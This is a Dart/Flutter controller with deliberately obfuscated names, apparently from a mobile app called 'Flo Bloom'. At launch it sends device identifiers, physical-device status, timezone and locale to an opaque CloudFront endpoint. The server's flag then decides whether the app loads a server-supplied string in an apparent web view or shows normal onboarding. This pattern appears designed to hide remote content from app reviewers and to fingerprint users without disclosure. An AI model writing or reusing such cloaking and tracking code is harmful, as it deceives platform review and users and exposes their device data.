import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class FloBloomCloudLogic extends GetxController {

  var tjhkwz = RxBool(false);
  var ehxjdyp = RxBool(true);
  var adfbup = RxString("");
  var cobwuhjx = RxBool(false);
  var tmjpuio = RxBool(true);
  final hofyvqcwl = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    bcuog();
  }


  Future<void> bcuog() async {
    cobwuhjx.value = true;
    tmjpuio.value = true;
    ehxjdyp.value = false;

    hofyvqcwl.post("https://dbijhqdkx6ndc.cloudfront.net/gfrwmikxjeasuocpnvhdq",data: await cfqybwkzvi()).then((value) {
      var kgszqynu = value.data["kgszqynu"] as String;
      var mcahk = value.data["mcahk"] as bool;
      if (mcahk) {
        adfbup.value = kgszqynu;
        yfwplnv();
      } else {
        krwhbuy();
      }
    }).catchError((e) {
      ehxjdyp.value = true;
      tmjpuio.value = true;
      cobwuhjx.value = false;
    });
  }

  Future<Map<String, dynamic>> cfqybwkzvi() async {
    final DeviceInfoPlugin ewol = DeviceInfoPlugin();
    PackageInfo oiyndp_jzohw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var dyjxmbf = Platform.localeName;
    var dpobe = currentTimeZone;

    var wxtjdyf = oiyndp_jzohw.packageName;
    var sloczwje = oiyndp_jzohw.version;
    var lnsrj = oiyndp_jzohw.buildNumber;

    var kqgpo = oiyndp_jzohw.appName;
    var oqedscp = "";
    var mkzvawe  = "";
    var dlhiscex = "";
    var jhgzxk = "";
    var nbtkdi = "";
    var buxghdv = "";
    var mypue = "";
    var idsvfxbl = "";
    var phkaceg = "";
    var bohri = "";
    var ltpho = "";


    var zwerg = "";
    var somef = false;

    if (GetPlatform.isAndroid) {
      zwerg = "android";
      var fsoncbgw = await ewol.androidInfo;

      dlhiscex = fsoncbgw.brand;

      oqedscp  = fsoncbgw.model;
      mkzvawe = fsoncbgw.id;

      somef = fsoncbgw.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zwerg = "ios";
      var ohuqdpfj = await ewol.iosInfo;
      dlhiscex = ohuqdpfj.name;
      oqedscp = ohuqdpfj.model;

      mkzvawe = ohuqdpfj.identifierForVendor ?? "";
      somef  = ohuqdpfj.isPhysicalDevice;
    }
    var res = {
      "lnsrj": lnsrj,
      "sloczwje": sloczwje,
      "wxtjdyf": wxtjdyf,
      "nbtkdi" : nbtkdi,
      "oqedscp": oqedscp,
      "jhgzxk" : jhgzxk,
      "dpobe": dpobe,
      "dlhiscex": dlhiscex,
      "mkzvawe": mkzvawe,
      "dyjxmbf": dyjxmbf,
      "zwerg": zwerg,
      "somef": somef,
      "buxghdv" : buxghdv,
      "mypue" : mypue,
      "kqgpo": kqgpo,
      "idsvfxbl" : idsvfxbl,
      "phkaceg" : phkaceg,
      "bohri" : bohri,
      "ltpho" : ltpho,

    };
    return res;
  }

  Future<void> krwhbuy() async {
    Get.offNamed("/flo_bloom_onboarding_1");
  }

  Future<void> yfwplnv() async {
    Get.offNamed("/flo_bloom_effect_data");
  }

}
